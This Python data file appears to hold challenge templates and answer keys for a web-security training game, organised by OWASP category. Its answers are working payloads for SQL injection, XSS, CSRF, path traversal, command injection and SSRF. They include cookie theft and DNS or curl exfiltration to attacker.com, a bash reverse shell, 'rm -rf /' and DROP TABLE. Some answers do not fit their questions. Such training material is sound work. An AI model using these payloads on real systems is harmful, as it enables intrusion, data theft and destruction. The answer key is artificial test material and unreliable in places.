"""
Daily Challenge Templates
Contains pre-built challenge templates for each OWASP category
"""


DAILY_CHALLENGE_TEMPLATES = {
    "SQL Injection": [
        {
            "title": "Admin Login Bypass",
            "difficulty": "Easy",
            "description": "Bypass the admin authentication using SQL Injection",
            "question": "The login form is vulnerable to SQL Injection. Find the payload to bypass authentication and login as admin without knowing the password.",
            "answer": "' OR 1=1 --",
            "xp_reward": 100,
            "hint": "Think about how to make the WHERE clause always return TRUE"
        },
        {
            "title": "Union-Based Data Extraction",
            "difficulty": "Medium",
            "description": "Extract database information using UNION-based SQL Injection",
            "question": "The application displays product IDs. Use UNION-based SQL Injection to extract the database version.",
            "answer": "' UNION SELECT @@version --",
            "xp_reward": 150,
            "hint": "Use UNION SELECT to combine your query with the original"
        },
        {
            "title": "Blind SQL Injection - Time-Based",
            "difficulty": "Hard",
            "description": "Extract data using time-based blind SQL Injection",
            "question": "No visible output is shown. Use time-based blind SQL Injection to determine if the database contains a table named 'users'.",
            "answer": "' AND IF(1=1,SLEEP(5),0) --",
            "xp_reward": 200,
            "hint": "Use SLEEP() function to create a delay when condition is true"
        },
        {
            "title": "Error-Based Injection",
            "difficulty": "Medium",
            "description": "Extract data using error-based SQL Injection",
            "question": "The application shows database errors. Use error-based SQL Injection to extract the current database name.",
            "answer": "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e)) --",
            "xp_reward": 175,
            "hint": "Force the database to throw an error containing the data you want"
        },
        {
            "title": "Second-Order Injection",
            "difficulty": "Hard",
            "description": "Exploit second-order SQL Injection vulnerability",
            "question": "Your username is stored during registration and used later in a query without sanitization. Craft an injection that executes during the second query.",
            "answer": "admin' OR '1'='1",
            "xp_reward": 250,
            "hint": "The injection happens in a different context than where you input it"
        },
        {
            "title": "Bypassing WAF with Encoding",
            "difficulty": "Hard",
            "description": "Bypass Web Application Firewall using encoding techniques",
            "question": "The WAF blocks 'OR 1=1'. Bypass it using URL encoding or double encoding.",
            "answer": "%27%20OR%201%3D1%20--",
            "xp_reward": 225,
            "hint": "Try URL encoding special characters like quotes and spaces"
        },
        {
            "title": "Stacked Queries Injection",
            "difficulty": "Medium",
            "description": "Execute multiple SQL statements using stacked queries",
            "question": "The application allows stacked queries. Insert a payload that drops the users table.",
            "answer": "'; DROP TABLE users; --",
            "xp_reward": 175,
            "hint": "Use semicolon to separate multiple SQL statements"
        },
        {
            "title": "Out-of-Band Data Exfiltration",
            "difficulty": "Hard",
            "description": "Exfiltrate data using out-of-band techniques",
            "question": "No direct output is available. Use DNS exfiltration to send data to your server.",
            "answer": "' AND LOAD_FILE(CONCAT('\\\\\\\\',DATABASE(),'.attacker.com\\\\a')) --",
            "xp_reward": 300,
            "hint": "Use LOAD_FILE or similar functions to make external requests"
        },
        {
            "title": "Bypassing Quote Filters",
            "difficulty": "Medium",
            "description": "Bypass input filters that block single quotes",
            "question": "The application filters single quotes. Bypass this protection using alternative syntax.",
            "answer": "admin' OR '1'='1",
            "xp_reward": 150,
            "hint": "Use char() function or hex encoding instead of quotes"
        },
        {
            "title": "Extracting Multiple Rows",
            "difficulty": "Medium",
            "description": "Extract multiple rows of data using LIMIT and OFFSET",
            "question": "Extract the second username from the users table using UNION-based injection with LIMIT.",
            "answer": "' UNION SELECT username FROM users LIMIT 1 OFFSET 1 --",
            "xp_reward": 175,
            "hint": "Use LIMIT and OFFSET to retrieve specific rows"
        },
        {
            "title": "Boolean-Based Blind Injection",
            "difficulty": "Medium",
            "description": "Extract information using boolean-based blind SQL Injection",
            "question": "The application behaves differently based on true/false conditions. Determine if the first character of the database name is 'a'.",
            "answer": "' AND SUBSTRING(DATABASE(),1,1)='a' --",
            "xp_reward": 200,
            "hint": "Use SUBSTRING() to check individual characters"
        },
        {
            "title": "Bypassing Magic Quotes",
            "difficulty": "Easy",
            "description": "Bypass PHP magic quotes protection",
            "question": "Magic quotes are enabled but the application is still vulnerable. Find a way to inject SQL despite the escaping.",
            "answer": "' OR 1=1 /*",
            "xp_reward": 125,
            "hint": "Use comments to break out of the escaped string context"
        },
        {
            "title": "Extracting Column Names",
            "difficulty": "Hard",
            "description": "Discover column names using information_schema",
            "question": "Find all column names in the 'users' table using information_schema.",
            "answer": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
            "xp_reward": 225,
            "hint": "Query information_schema.columns to enumerate table structure"
        },
        {
            "title": "Bypassing Numeric Filters",
            "difficulty": "Easy",
            "description": "Bypass filters that only allow numeric input",
            "question": "The parameter only accepts numbers. Use a technique to inject SQL without using letters.",
            "answer": "1 OR 1=1",
            "xp_reward": 100,
            "hint": "You don't always need quotes or letters for injection"
        },
        {
            "title": "Advanced Filter Evasion",
            "difficulty": "Hard",
            "description": "Evade advanced WAF rules using multiple techniques",
            "question": "The WAF blocks common keywords like UNION, SELECT, OR. Bypass it using case variation and comments.",
            "answer": "' UnIoN SeLeCt @@version --",
            "xp_reward": 250,
            "hint": "Try case variation: UnIoN, SeLeCt, or use inline comments: UN/**/ION"
        }
    ],
    "XSS": [
        {
            "title": "Basic Reflected XSS",
            "difficulty": "Easy",
            "description": "Execute basic reflected XSS attack",
            "question": "The search parameter is reflected in the page without encoding. Inject a script that displays an alert box.",
            "answer": "<script>alert('XSS')</script>",
            "xp_reward": 100,
            "hint": "Use <script> tags to execute JavaScript"
        },
        {
            "title": "Event Handler XSS",
            "difficulty": "Easy",
            "description": "Bypass filters using event handlers",
            "question": "Script tags are filtered. Use an HTML event handler to execute JavaScript.",
            "answer": "<img src=x onerror=alert('XSS')>",
            "xp_reward": 125,
            "hint": "Use onerror, onload, or onclick event handlers"
        },
        {
            "title": "DOM-Based XSS",
            "difficulty": "Medium",
            "description": "Exploit DOM-based XSS vulnerability",
            "question": "The page uses document.write() with URL parameter. Craft a payload that executes JavaScript in the DOM.",
            "answer": "<script>alert('DOM XSS')</script>",
            "xp_reward": 150,
            "hint": "The vulnerability exists in client-side JavaScript, not server-side"
        },
        {
            "title": "Bypassing Content Security Policy",
            "difficulty": "Hard",
            "description": "Bypass CSP to execute inline scripts",
            "question": "CSP is implemented but misconfigured. Find a way to execute inline JavaScript despite the policy.",
            "answer": "<script>alert('CSP Bypass')</script>",
            "xp_reward": 200,
            "hint": "Look for unsafe-inline or weak nonce implementation"
        },
        {
            "title": "Stored XSS in Comments",
            "difficulty": "Medium",
            "description": "Inject stored XSS in comment section",
            "question": "Post a comment that executes JavaScript when other users view it.",
            "answer": "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
            "xp_reward": 175,
            "hint": "The payload is stored in the database and displayed to all users"
        },
        {
            "title": "XSS in JSON Response",
            "difficulty": "Medium",
            "description": "Exploit XSS in JSON API response",
            "question": "The API returns JSON with your input. Craft a payload that executes when parsed by the application.",
            "answer": '{"name":"<script>alert(1)</script>"}',
            "xp_reward": 175,
            "hint": "JSON data can be rendered as HTML if not properly handled"
        },
        {
            "title": "Bypassing HTML Entity Encoding",
            "difficulty": "Hard",
            "description": "Bypass HTML entity encoding filters",
            "question": "The application encodes < and > but is still vulnerable. Find an alternative way to inject JavaScript.",
            "answer": "<img src=x onerror=alert(1)>",
            "xp_reward": 200,
            "hint": "Use event handlers that don't require angle brackets"
        },
        {
            "title": "SVG-Based XSS",
            "difficulty": "Medium",
            "description": "Execute XSS using SVG files",
            "question": "The application allows SVG uploads. Create an SVG that executes JavaScript when rendered.",
            "answer": "<svg onload=alert('XSS')></svg>",
            "xp_reward": 175,
            "hint": "SVG elements support JavaScript event handlers"
        },
        {
            "title": "XSS via CSS",
            "difficulty": "Hard",
            "description": "Execute JavaScript using CSS injection",
            "question": "Inject CSS that executes JavaScript using expression() or other CSS-based techniques.",
            "answer": "<style>body{background:url('javascript:alert(1)')}</style>",
            "xp_reward": 225,
            "hint": "Older browsers support expression() in CSS"
        },
        {
            "title": "Mutation XSS",
            "difficulty": "Hard",
            "description": "Exploit mutation XSS in innerHTML parsing",
            "question": "The application uses innerHTML but sanitizes input. Find a mutation XSS payload that bypasses the sanitizer.",
            "answer": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>",
            "xp_reward": 250,
            "hint": "Mutation XSS exploits differences between parser contexts"
        },
        {
            "title": "XSS in Href Attribute",
            "difficulty": "Medium",
            "description": "Inject XSS via href attribute",
            "question": "Your input is placed in an href attribute. Inject a payload that executes JavaScript.",
            "answer": "javascript:alert('XSS')",
            "xp_reward": 150,
            "hint": "Use javascript: protocol in href attributes"
        },
        {
            "title": "Bypassing WAF with Encoding",
            "difficulty": "Medium",
            "description": "Bypass XSS WAF using various encoding techniques",
            "question": "The WAF blocks common XSS patterns. Bypass it using Unicode or base64 encoding.",
            "answer": "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            "xp_reward": 175,
            "hint": "Encode your payload using atob() or Unicode escapes"
        },
        {
            "title": "XSS via File Upload",
            "difficulty": "Medium",
            "description": "Upload an SVG file containing XSS",
            "question": "Upload an SVG file that executes JavaScript when viewed by an admin.",
            "answer": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS')\"></svg>",
            "xp_reward": 175,
            "hint": "SVG is XML-based and supports JavaScript event handlers"
        },
        {
            "title": "Reflected XSS in Error Page",
            "difficulty": "Easy",
            "description": "Inject XSS in custom error page",
            "question": "The 404 error page reflects the requested URL. Inject a payload that executes when the error page is displayed.",
            "answer": "<script>alert('XSS')</script>",
            "xp_reward": 100,
            "hint": "Error pages often reflect user input without proper encoding"
        },
        {
            "title": "XSS via Template Injection",
            "difficulty": "Hard",
            "description": "Exploit server-side template injection leading to XSS",
            "question": "The application uses template injection. Inject a payload that executes JavaScript in the user's browser.",
            "answer": "{{alert('XSS')}}",
            "xp_reward": 225,
            "hint": "Template injection can sometimes lead to XSS if user input is rendered"
        }
    ],
    "CSRF": [
        {
            "title": "Basic CSRF Attack",
            "difficulty": "Easy",
            "description": "Perform a basic CSRF attack to change user email",
            "question": "Create an HTML form that changes the victim's email address without their knowledge.",
            "answer": "<form action=\"http://target.com/change_email\" method=\"POST\"><input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\"></form>",
            "xp_reward": 100,
            "hint": "Use a hidden form that auto-submits"
        },
        {
            "title": "CSRF with GET Request",
            "difficulty": "Easy",
            "description": "Exploit CSRF using GET request",
            "question": "The password change functionality uses GET requests. Craft a CSRF attack URL.",
            "answer": "http://target.com/change_password?new_pass=attacker123",
            "xp_reward": 100,
            "hint": "Use an <img> tag with the malicious URL as the src"
        },
        {
            "title": "CSRF Token Bypass",
            "difficulty": "Medium",
            "description": "Bypass CSRF token validation",
            "question": "The application checks CSRF tokens but has a flaw. Find a way to bypass the protection.",
            "answer": "Remove token parameter or use same token",
            "xp_reward": 150,
            "hint": "Look for token validation bypass techniques"
        },
        {
            "title": "CSRF via JSON Request",
            "difficulty": "Medium",
            "description": "Perform CSRF with JSON content type",
            "question": "The API accepts JSON requests. Craft a CSRF attack that sends JSON data.",
            "answer": "<form enctype=\"text/plain\"><input name='{\"email\":\"attacker@evil.com\"}'></form>",
            "xp_reward": 175,
            "hint": "Use form enctype to send JSON-like data"
        },
        {
            "title": "CSRF with CORS Misconfiguration",
            "difficulty": "Hard",
            "description": "Exploit CSRF via CORS misconfiguration",
            "question": "The server has CORS misconfigured to allow arbitrary origins. Use this to perform CSRF with credential inclusion.",
            "answer": "fetch('http://target.com/transfer', {method: 'POST', credentials: 'include'})",
            "xp_reward": 200,
            "hint": "CORS misconfiguration can enable CSRF with credentials"
        },
        {
            "title": "CSRF via Image Tag",
            "difficulty": "Easy",
            "description": "Use image tag for CSRF attack",
            "question": "Perform CSRF using an image tag to trigger a state-changing GET request.",
            "answer": "<img src=\"http://target.com/admin/delete_user?id=1\">",
            "xp_reward": 100,
            "hint": "Image tags can trigger GET requests without user interaction"
        },
        {
            "title": "CSRF with Clickjacking",
            "difficulty": "Medium",
            "description": "Combine CSRF with clickjacking",
            "question": "Frame the target application and trick users into clicking hidden buttons.",
            "answer": "<iframe src=\"http://target.com/settings\" style=\"opacity:0\"></iframe>",
            "xp_reward": 175,
            "hint": "Use iframe with transparency to overlay invisible UI"
        },
        {
            "title": "CSRF Token in URL",
            "difficulty": "Medium",
            "description": "Exploit CSRF token exposed in URL",
            "question": "The CSRF token is passed via URL parameter. Exploit this to perform CSRF.",
            "answer": "http://target.com/transfer?to=attacker&amount=1000&token=leaked_token",
            "xp_reward": 150,
            "hint": "URL parameters can be leaked via Referer header"
        },
        {
            "title": "CSRF via Flash",
            "difficulty": "Hard",
            "description": "Perform CSRF using Flash file",
            "question": "The application accepts Flash uploads. Create a Flash-based CSRF attack.",
            "answer": "Use Flash to make cross-domain requests",
            "xp_reward": 225,
            "hint": "Flash can bypass same-origin policy restrictions"
        },
        {
            "title": "CSRF with Login CSRF",
            "difficulty": "Medium",
            "description": "Force user to login to attacker-controlled account",
            "question": "Perform login CSRF to make the victim login to your account.",
            "answer": "<form action=\"http://target.com/login\" method=\"POST\"><input name=\"username\" value=\"attacker\"><input name=\"password\" value=\"attacker_pass\"></form>",
            "xp_reward": 150,
            "hint": "Login CSRF lets you view victim's activity in your account"
        },
        {
            "title": "CSRF via POST with Image",
            "difficulty": "Medium",
            "description": "Perform POST-based CSRF using image tag",
            "question": "The application accepts POST requests. Use an image tag to trigger a POST-based CSRF.",
            "answer": "<img src=\"http://target.com/api/transfer\" onerror=\"document.createElement('form').submit()\">",
            "xp_reward": 175,
            "hint": "Combine image tag with JavaScript to make POST requests"
        },
        {
            "title": "CSRF Token Not Tied to Session",
            "difficulty": "Hard",
            "description": "Exploit CSRF token not bound to user session",
            "question": "CSRF tokens are not tied to sessions. Use a fixed token to bypass protection.",
            "answer": "Use any valid token or fixed token value",
            "xp_reward": 200,
            "hint": "If tokens aren't session-bound, any token works"
        },
        {
            "title": "CSRF via XSS",
            "difficulty": "Hard",
            "description": "Chain XSS with CSRF for maximum impact",
            "question": "There's a reflected XSS on the same page. Chain it with CSRF to bypass same-origin policy.",
            "answer": "<script>fetch('/api/transfer', {method:'POST', body:new FormData(document.querySelector('form'))})</script>",
            "xp_reward": 250,
            "hint": "XSS bypasses same-origin policy, enabling CSRF"
        },
        {
            "title": "CSRF in API with Custom Headers",
            "difficulty": "Medium",
            "description": "Bypass CSRF protection that checks custom headers",
            "question": "The API checks for X-Requested-With header. Bypass this check.",
            "answer": "<form><input name=\"X-Requested-With\" value=\"XMLHttpRequest\"></form>",
            "xp_reward": 175,
            "hint": "Form inputs can set custom headers in some browsers"
        },
        {
            "title": "CSRF via Subdomain",
            "difficulty": "Hard",
            "description": "Exploit CSRF using subdomain takeover",
            "question": "A subdomain is vulnerable to takeover. Use it to perform CSRF attacks.",
            "answer": "Host attack on subdomain.target.com",
            "xp_reward": 225,
            "hint": "Subdomains may bypass same-origin policy"
        }
    ],
    "Path Traversal": [
        {
            "title": "Basic Directory Traversal",
            "difficulty": "Easy",
            "description": "Access files outside web root using directory traversal",
            "question": "The application loads files based on user input. Access /etc/passwd using path traversal.",
            "answer": "../../../etc/passwd",
            "xp_reward": 100,
            "hint": "Use ../ to move up directories"
        },
        {
            "title": "Bypassing Basic Filters",
            "difficulty": "Medium",
            "description": "Bypass path traversal filters",
            "question": "The application blocks ../ sequences. Bypass this protection.",
            "answer": "....//....//....//etc/passwd",
            "xp_reward": 150,
            "hint": "Try double encoding or alternative traversal sequences"
        },
        {
            "title": "Null Byte Injection",
            "difficulty": "Medium",
            "description": "Use null byte to bypass file extension checks",
            "question": "The application appends .php to user input. Bypass this to read /etc/passwd.",
            "answer": "../../../etc/passwd%00",
            "xp_reward": 150,
            "hint": "Use %00 (null byte) to truncate the appended extension"
        },
        {
            "title": "Windows Path Traversal",
            "difficulty": "Easy",
            "description": "Perform path traversal on Windows server",
            "question": "The server runs Windows. Access boot.ini using path traversal.",
            "answer": "..\\..\\..\\boot.ini",
            "xp_reward": 100,
            "hint": "Windows uses backslashes instead of forward slashes"
        },
        {
            "title": "Bypassing Extension Block",
            "difficulty": "Hard",
            "description": "Bypass file extension blacklist",
            "question": "The application blocks .php, .txt, and other extensions. Read /etc/passwd anyway.",
            "answer": "file:///etc/passwd",
            "xp_reward": 200,
            "hint": "Try using file:// protocol wrapper"
        },
        {
            "title": "Path Traversal in ZIP",
            "difficulty": "Medium",
            "description": "Exploit path traversal in ZIP file extraction",
            "question": "The application extracts ZIP files. Create a ZIP that writes files outside the intended directory.",
            "answer": "Create ZIP with ../../evil.php path",
            "xp_reward": 175,
            "hint": "ZIP entries can contain path traversal sequences"
        },
        {
            "title": "Bypassing Double Encoding",
            "difficulty": "Hard",
            "description": "Bypass filters using double encoding",
            "question": "The application decodes input once. Use double encoding to bypass the filter.",
            "answer": "%252e%252e%252fetc/passwd",
            "xp_reward": 225,
            "hint": "Encode ../ as %252e%252e%252f"
        },
        {
            "title": "Path Traversal via Log Poisoning",
            "difficulty": "Hard",
            "description": "Use path traversal for log poisoning attack",
            "question": "Access log files and inject PHP code for RCE.",
            "answer": "../../../var/log/apache2/access.log",
            "xp_reward": 250,
            "hint": "Include PHP code in User-Agent, then access the log file"
        },
        {
            "title": "Bypassing Length Limits",
            "difficulty": "Medium",
            "description": "Bypass path length restrictions",
            "question": "The application limits path length to 20 characters. Access /etc/passwd anyway.",
            "answer": "Use shorter paths or symlinks",
            "xp_reward": 150,
            "hint": "Try using symlinks or shorter path representations"
        },
        {
            "title": "Path Traversal in Include",
            "difficulty": "Easy",
            "description": "Exploit path traversal in PHP include()",
            "question": "The application uses include() with user input. Include /etc/passwd.",
            "answer": "../../../etc/passwd",
            "xp_reward": 100,
            "hint": "PHP include() is vulnerable to path traversal"
        },
        {
            "title": "Bypassing Dot Filter",
            "difficulty": "Medium",
            "description": "Bypass filter that blocks dots",
            "question": "The application blocks all dots. Access /etc/passwd without using dots.",
            "answer": "%2e%2e%2fetc/passwd",
            "xp_reward": 150,
            "hint": "URL encode the dots as %2e"
        },
        {
            "title": "Path Traversal in Backup Files",
            "difficulty": "Easy",
            "description": "Access backup files using path traversal",
            "question": "Find and access the database backup file using path traversal.",
            "answer": "../../../backup/db.sql",
            "xp_reward": 100,
            "hint": "Look for common backup file locations"
        },
        {
            "title": "Bypassing Slash Filter",
            "difficulty": "Hard",
            "description": "Bypass filter that blocks forward slashes",
            "question": "The application blocks / characters. Access /etc/passwd anyway.",
            "answer": "%2e%2e%5c%2e%2e%5cetc%5cpasswd",
            "xp_reward": 200,
            "hint": "Use backslashes or URL encoding"
        },
        {
            "title": "Path Traversal in Image Upload",
            "difficulty": "Medium",
            "description": "Exploit path traversal in image upload functionality",
            "question": "Upload an image but store it outside the upload directory using path traversal.",
            "answer": "filename=../../../shell.php",
            "xp_reward": 175,
            "hint": "Manually set the filename parameter to include traversal"
        },
        {
            "title": "Bypassing Case Sensitivity",
            "difficulty": "Medium",
            "description": "Bypass case-sensitive filters",
            "question": "The filter is case-sensitive. Use mixed case to bypass it.",
            "answer": "..%2f..%2f..%2fetc/passwd",
            "xp_reward": 150,
            "hint": "Mix URL encoding with normal characters"
        }
    ],
    "Command Injection": [
        {
            "title": "Basic Command Injection",
            "difficulty": "Easy",
            "description": "Execute basic command injection",
            "question": "The application executes system commands with user input. Execute 'whoami' command.",
            "answer": "; whoami",
            "xp_reward": 100,
            "hint": "Use ; to chain commands"
        },
        {
            "title": "Blind Command Injection",
            "difficulty": "Medium",
            "description": "Exploit blind command injection",
            "question": "No output is displayed. Use time-based blind injection to confirm command execution.",
            "answer": "; sleep 10",
            "xp_reward": 150,
            "hint": "Use sleep or ping to detect command execution"
        },
        {
            "title": "Bypassing Filters",
            "difficulty": "Medium",
            "description": "Bypass command injection filters",
            "question": "The application blocks common characters like ; and |. Find an alternative way to inject commands.",
            "answer": "$(whoami)",
            "xp_reward": 150,
            "hint": "Use $() or backticks for command substitution"
        },
        {
            "title": "Command Injection via Newline",
            "difficulty": "Easy",
            "description": "Use newline to inject commands",
            "question": "The application filters semicolons but not newlines. Inject a command using newline.",
            "answer": "\nwhoami",
            "xp_reward": 100,
            "hint": "Try using %0a (URL-encoded newline)"
        },
        {
            "title": "Blind Out-of-Band",
            "difficulty": "Hard",
            "description": "Exfiltrate data using out-of-band command injection",
            "question": "No output is shown. Use DNS or HTTP requests to exfiltrate data.",
            "answer": "; curl http://attacker.com/?data=$(whoami)",
            "xp_reward": 200,
            "hint": "Make the server send data to your server"
        },
        {
            "title": "Command Injection in Ping",
            "difficulty": "Easy",
            "description": "Exploit command injection in ping functionality",
            "question": "The ping function is vulnerable. Execute 'id' command using the ping utility.",
            "answer": "127.0.0.1; id",
            "xp_reward": 100,
            "hint": "Append commands after the IP address"
        },
        {
            "title": "Bypassing Word Filters",
            "difficulty": "Medium",
            "description": "Bypass filters that block specific commands",
            "question": "The application blocks 'whoami', 'cat', and other commands. Find a way to read /etc/passwd.",
            "answer": "$(cat /etc/passwd)",
            "xp_reward": 150,
            "hint": "Use command substitution or alternative commands"
        },
        {
            "title": "Command Injection via Logs",
            "difficulty": "Hard",
            "description": "Inject commands via log file poisoning",
            "question": "User-Agent is logged and later executed. Poison the log to execute commands.",
            "answer": "Set User-Agent to: $(malicious_command)",
            "xp_reward": 225,
            "hint": "If logs are executed, inject commands into loggable fields"
        },
        {
            "title": "RCE via Command Injection",
            "difficulty": "Hard",
            "description": "Achieve remote code execution",
            "question": "Gain a reverse shell using command injection.",
            "answer": "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "xp_reward": 300,
            "hint": "Use bash reverse shell payload"
        },
        {
            "title": "Command Injection in Email",
            "difficulty": "Medium",
            "description": "Inject commands via email functionality",
            "question": "The email function is vulnerable. Inject a command to read sensitive files.",
            "answer": "user@test.com; cat /etc/passwd",
            "xp_reward": 150,
            "hint": "Email fields often pass to system commands"
        },
        {
            "title": "Bypassing Space Filter",
            "difficulty": "Medium",
            "description": "Bypass filters that block spaces",
            "question": "Spaces are filtered. Execute 'ls -la' without using spaces.",
            "answer": "ls${IFS}-la",
            "xp_reward": 150,
            "hint": "Use $IFS or tabs instead of spaces"
        },
        {
            "title": "Command Injection via File Upload",
            "difficulty": "Hard",
            "description": "Execute commands via file upload filename",
            "question": "The filename is used in a system command. Inject commands via the filename.",
            "answer": "file.php; rm -rf /",
            "xp_reward": 200,
            "hint": "Filename is passed to system() or exec()"
        },
        {
            "title": "Time-Based Blind Injection",
            "difficulty": "Medium",
            "description": "Use time delays to confirm blind command injection",
            "question": "No output is visible. Confirm command injection using time delays.",
            "answer": "; ping -c 10 127.0.0.1",
            "xp_reward": 175,
            "hint": "Use ping or sleep to create detectable delays"
        },
        {
            "title": "Command Injection in DNS Lookup",
            "difficulty": "Easy",
            "description": "Exploit command injection in DNS lookup function",
            "question": "The DNS lookup function is vulnerable. Execute 'id' command.",
            "answer": "google.com; id",
            "xp_reward": 100,
            "hint": "DNS lookup functions often use system() calls"
        },
        {
            "title": "Bypassing Quote Filters",
            "difficulty": "Medium",
            "description": "Bypass filters that block quotes",
            "question": "Single and double quotes are filtered. Execute commands without quotes.",
            "answer": "; cat /etc/passwd",
            "xp_reward": 150,
            "hint": "Not all commands require quotes"
        }
    ],
    "Broken Authentication": [
        {
            "title": "Weak Password Policy",
            "difficulty": "Easy",
            "description": "Exploit weak password requirements",
            "question": "The application allows weak passwords. What password would you choose to maximize security?",
            "answer": "Use strong, unique password",
            "xp_reward": 100,
            "hint": "Think about password complexity requirements"
        },
        {
            "title": "Credential Stuffing",
            "difficulty": "Medium",
            "description": "Perform credential stuffing attack",
            "question": "You have a list of leaked credentials. How would you test them against the login?",
            "answer": "Automate login attempts with leaked credentials",
            "xp_reward": 150,
            "hint": "Use automation to test multiple credential pairs"
        },
        {
            "title": "Brute Force Attack",
            "difficulty": "Easy",
            "description": "Perform brute force attack on login",
            "question": "The login has no rate limiting. Describe how to brute force the password.",
            "answer": "Use automated tool to try all combinations",
            "xp_reward": 100,
            "hint": "Tools like Hydra or Burp Intruder can automate this"
        },
        {
            "title": "Session Fixation",
            "difficulty": "Medium",
            "description": "Exploit session fixation vulnerability",
            "question": "The application doesn't regenerate session IDs on login. Exploit this to hijack a user's session.",
            "answer": "Set victim's session ID, wait for login, then use same session ID",
            "xp_reward": 175,
            "hint": "Session fixation: set known session, victim logs in, attacker uses same session"
        },
        {
            "title": "Password Reset Poisoning",
            "difficulty": "Hard",
            "description": "Poison password reset to steal token",
            "question": "The password reset function uses the Host header. Poison it to steal reset tokens.",
            "answer": "Host: attacker.com in request",
            "xp_reward": 225,
            "hint": "Manipulate Host header to point password reset link to your server"
        },
        {
            "title": "JWT None Algorithm",
            "difficulty": "Hard",
            "description": "Bypass JWT authentication using 'none' algorithm",
            "question": "The JWT implementation accepts the 'none' algorithm. Forge a token to gain admin access.",
            "answer": "Change algorithm to 'none' and remove signature",
            "xp_reward": 250,
            "hint": "Send JWT with alg:none and no signature"
        },
        {
            "title": "JWT Secret Brute Force",
            "difficulty": "Medium",
            "description": "Brute force JWT signing secret",
            "question": "The JWT is signed with a weak secret. Find the secret and forge a token.",
            "answer": "Use hashcat or john to crack the secret",
            "xp_reward": 200,
            "hint": "Weak secrets can be brute-forced from the JWT signature"
        },
        {
            "title": "Insecure Direct Object Reference",
            "difficulty": "Medium",
            "description": "Access other users' data via IDOR",
            "question": "Change the user ID in the URL to access another user's profile.",
            "answer": "Change /profile/123 to /profile/124",
            "xp_reward": 150,
            "hint": "Sequential IDs allow enumeration of other users' data"
        },
        {
            "title": "Credential Exposure in Source",
            "difficulty": "Easy",
            "description": "Find exposed credentials in source code",
            "question": "Find hardcoded credentials in the JavaScript source code.",
            "answer": "Check comments, API keys in JS files",
            "xp_reward": 100,
            "hint": "Developers often leave credentials in client-side code"
        },
        {
            "title": "Authentication Bypass",
            "difficulty": "Hard",
            "description": "Bypass authentication entirely",
            "question": "Find a way to access admin functionality without logging in.",
            "answer": "Manipulate parameters, cookies, or headers",
            "xp_reward": 250,
            "hint": "Look for parameter pollution or role manipulation"
        },
        {
            "title": "Password in URL",
            "difficulty": "Easy",
            "description": "Exploit password passed in URL",
            "question": "The application passes passwords in URL parameters. Explain the risk.",
            "answer": "URLs are logged in server logs and browser history",
            "xp_reward": 100,
            "hint": "URLs appear in many logs and can be intercepted"
        },
        {
            "title": "Session Expiration Bypass",
            "difficulty": "Medium",
            "description": "Bypass session expiration controls",
            "question": "Sessions should expire after 30 minutes. Keep your session alive indefinitely.",
            "answer": "Refresh session before expiration or manipulate session timeout",
            "xp_reward": 150,
            "hint": "Session tokens may not expire as expected"
        },
        {
            "title": "Multi-Factor Authentication Bypass",
            "difficulty": "Hard",
            "description": "Bypass MFA implementation",
            "question": "MFA is implemented but has flaws. Bypass the second factor.",
            "answer": "Manipulate session, skip MFA step, or brute force OTP",
            "xp_reward": 225,
            "hint": "Look for ways to skip or manipulate the MFA step"
        },
        {
            "title": "OAuth Misconfiguration",
            "difficulty": "Hard",
            "description": "Exploit OAuth misconfiguration",
            "question": "The OAuth implementation has flaws. Hijack accounts via OAuth.",
            "answer": "Manipulate redirect_uri or state parameter",
            "xp_reward": 250,
            "hint": "OAuth flaws often involve redirect_uri validation"
        },
        {
            "title": "API Key Exposure",
            "difficulty": "Easy",
            "description": "Find exposed API keys",
            "question": "Find API keys or tokens exposed in the application.",
            "answer": "Check source code, network requests, and localStorage",
            "xp_reward": 100,
            "hint": "API keys are often hardcoded in client-side code"
        }
    ],
    "SSRF": [
        {
            "title": "Basic SSRF to Localhost",
            "difficulty": "Easy",
            "description": "Access localhost services using SSRF",
            "question": "The application fetches URLs from user input. Access the internal service on localhost:8080.",
            "answer": "http://localhost:8080",
            "xp_reward": 100,
            "hint": "Use localhost or 127.0.0.1 to access internal services"
        },
        {
            "title": "SSRF to Cloud Metadata",
            "difficulty": "Medium",
            "description": "Access cloud metadata service",
            "question": "The server runs on AWS. Access the metadata service to steal IAM credentials.",
            "answer": "http://169.254.169.254/latest/meta-data/",
            "xp_reward": 200,
            "hint": "Cloud providers have metadata endpoints at special IPs"
        },
        {
            "title": "Bypassing SSRF Filters",
            "difficulty": "Medium",
            "description": "Bypass SSRF blacklist filters",
            "question": "The application blocks localhost and 127.0.0.1. Find an alternative way to access internal services.",
            "answer": "http://127.1 or http://2130706433 (decimal IP)",
            "xp_reward": 175,
            "hint": "Try alternative representations of localhost"
        },
        {
            "title": "SSRF via File Protocol",
            "difficulty": "Medium",
            "description": "Use file:// protocol to read local files",
            "question": "The application supports file:// protocol. Read /etc/passwd using SSRF.",
            "answer": "file:///etc/passwd",
            "xp_reward": 150,
            "hint": "Use file:// protocol to read local files"
        },
        {
            "title": "Blind SSRF",
            "difficulty": "Hard",
            "description": "Exploit blind SSRF vulnerability",
            "question": "No output is returned. Confirm SSRF using out-of-band techniques.",
            "answer": "http://attacker.com/ssrf?data=secret",
            "xp_reward": 225,
            "hint": "Use DNS or HTTP requests to your server to confirm"
        },
        {
            "title": "SSRF in PDF Generation",
            "difficulty": "Medium",
            "description": "Exploit SSRF in PDF generation feature",
            "question": "The PDF generator fetches images from URLs. Use SSRF to scan internal ports.",
            "answer": "http://localhost:22, http://localhost:3306",
            "xp_reward": 175,
            "hint": "Different response times or errors reveal open ports"
        },
        {
            "title": "SSRF via Webhook",
            "difficulty": "Medium",
            "description": "Exploit SSRF in webhook functionality",
            "question": "The webhook feature makes requests to user-specified URLs. Use it to scan internal network.",
            "answer": "http://192.168.1.1/admin",
            "xp_reward": 175,
            "hint": "Webhooks often trust user-provided URLs"
        },
        {
            "title": "Bypassing DNS Rebinding",
            "difficulty": "Hard",
            "description": "Bypass SSRF filters using DNS rebinding",
            "question": "The application validates the IP but uses DNS. Use rebinding to bypass the check.",
            "answer": "Use domain that resolves to allowed IP first, then internal IP",
